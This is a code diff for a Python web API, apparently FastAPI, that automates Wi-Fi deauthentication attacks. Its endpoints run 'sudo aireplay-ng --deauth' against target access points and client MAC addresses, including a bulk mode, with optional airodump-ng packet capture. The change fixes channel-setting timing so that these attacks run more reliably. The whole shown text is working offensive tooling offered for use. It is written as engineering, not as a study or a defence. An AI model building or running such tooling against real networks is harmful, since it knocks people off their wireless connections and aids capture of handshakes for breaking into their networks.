@@ -128,15 +128,12 @@ def run_deauth_attack(bssid: str, interface: str, channel: int, client_mac: Opti
     """
     Run the actual deauth attack in background.
     - Writes aireplay output to log file (avoids PIPE deadlock)
-    - Skips iw set channel (airodump-ng already locked it) 
+    - Channel is set in /execute BEFORE this function runs
     - DB session is optional (may be closed after request returns)
     """
     try:
         count = normalize_count(count)
         print(f"🔍 Starting deauth on {bssid} (interface: {interface}, count: {count})")
-
-        # ⬇️ REMOVED: set_interface_channel — airodump-ng already set the channel
-        # Calling iw while airodump runs causes 5s timeout → blocks everything
 
         if client_mac:
             cmd = f"sudo aireplay-ng --deauth {count} -c {client_mac} -a {bssid} {interface}"
@@ -331,6 +328,17 @@ async def execute_deauth(
         )
 
     interface = monitor_iface
+    target_channel = request.channel or 1
+
+    # ⬇️ CRITICAL FIX: Set channel ONCE, before airodump/aireplay start
+    print(f"📡 Setting channel {target_channel} on {interface} (before attack starts)...")
+    channel_ok = set_interface_channel(interface, target_channel)
+    if channel_ok:
+        print(f"✅ Channel set to {target_channel}")
+    else:
+        print(f"⚠️ Could not confirm channel {target_channel} — airodump will retry")
+
+    time.sleep(1)
 
     # Start capture if requested
     capture_info = None
@@ -338,7 +346,7 @@ async def execute_deauth(
         try:
             capture_info = capture_service.start_capture(
                 bssid=request.bssid,
-                channel=request.channel or 1,
+                channel=target_channel,
                 interface=monitor_iface,
             )
 
@@ -356,12 +364,16 @@ async def execute_deauth(
         except Exception as e:
             print(f"❌ Failed to start capture: {e}")
 
+    # ⬇️ Delay so airodump has locked the channel before aireplay starts
+    if capture_info:
+        time.sleep(1.5)
+
     # Start deauth (no db — session closed after request)
     background_tasks.add_task(
         run_deauth_attack,
         request.bssid,
         interface,
-        request.channel or 1,
+        target_channel,
         request.client_mac,
         normalize_count(request.count),
     )
@@ -371,6 +383,8 @@ async def execute_deauth(
         "message": f"Deauth attack started on {request.bssid or request.client_mac}",
         "status": "queued",
         "interface": interface,
+        "channel": target_channel,
+        "channel_set": channel_ok,
         "monitor_created": result["was_created"],
         "capture": capture_info and {
             "started": True,
@@ -425,6 +439,11 @@ async def bulk_execute_deauth(
 ):
     result = ensure_monitor_mode()
     interface = result["monitor_interface"]
+    target_channel = request.channel or 1
+
+    # ⬇️ Set channel once before any attack
+    set_interface_channel(interface, target_channel)
+    time.sleep(1)
 
     results = []
     for client_mac in request.client_macs:
@@ -433,7 +452,7 @@ async def bulk_execute_deauth(
                 run_deauth_attack,
                 request.bssid,
                 interface,
-                request.channel or 1,
+                target_channel,
                 client_mac,
                 normalize_count(request.count),
             )
@@ -564,6 +583,11 @@ async def deauth_ap(
 ):
     result = ensure_monitor_mode()
     interface = result["monitor_interface"]
+    target_channel = request.channel or 1
+
+    # ⬇️ Set channel once before any attack
+    set_interface_channel(interface, target_channel)
+    time.sleep(1)
 
     from app.services.deauth.ap_service import DeauthAPService
     ap_service = DeauthAPService(db)
@@ -574,7 +598,7 @@ async def deauth_ap(
             run_deauth_attack,
             bssid,
             interface,
-            request.channel or 1,
+            target_channel,
             None,
             normalize_count(request.count),
         )
@@ -593,7 +617,7 @@ async def deauth_ap(
                 run_deauth_attack,
                 bssid,
                 interface,
-                request.channel or 1,
+                target_channel,
                 client_mac,
                 normalize_count(request.count),
             )
